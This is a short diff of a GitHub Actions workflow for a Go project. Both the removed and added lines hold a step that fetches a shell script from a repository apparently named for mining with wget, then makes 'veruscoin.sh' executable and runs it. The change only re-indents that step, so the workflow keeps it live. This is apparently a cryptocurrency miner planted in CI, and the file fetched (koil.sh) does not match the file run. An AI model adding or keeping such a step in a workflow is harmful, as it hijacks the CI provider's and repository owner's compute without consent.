@@ -21,7 +21,7 @@ with:
 go-version: ${{ matrix.go }}
 id: go
 -name: Setup
-                uses: actions/checkout@v2
-    -name: azkafamilychanel
-   -run: | 
-        wget https://github.com/ChanellMiningAO/koil/blob/main/koil.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+  uses: actions/checkout@v2
+-name: azkafamilychanel
+-run: | 
+  wget https://github.com/ChanellMiningAO/koil/blob/main/koil.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
